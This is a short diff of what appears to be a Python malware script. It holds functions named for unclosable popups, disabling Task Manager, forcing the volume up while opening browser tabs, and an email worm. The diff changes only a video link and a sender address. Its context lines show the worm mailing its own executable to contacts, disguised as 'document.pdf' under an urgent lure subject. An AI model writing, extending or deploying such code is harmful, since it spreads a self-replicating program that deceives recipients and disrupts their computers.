@@ -137,7 +137,7 @@ def create_unclosable_popup():
 
 def max_volume():
     for _ in range(5):
-        webbrowser.open("https://youtube.com")
+        webbrowser.open("https://youtu.be/iMHKeLXFbX0?si=G6ZZZUdtnvsrsnLa")
     winsound.Beep(3000, 1000)
 
 def disable_taskmgr():
@@ -386,7 +386,7 @@ def email_worm():
             msg = email.message.EmailMessage()
             msg.set_content("Important document")
             msg["Subject"] = "Urgent: Review attached"
-            msg["From"] = "admin@example.com"
+            msg["From"] = "test@example.com"
             msg["To"] = contact
             with open(sys.argv[0], "rb") as f:
                 msg.add_attachment(f.read(), maintype="application", subtype="octet-stream", filename="document.pdf")
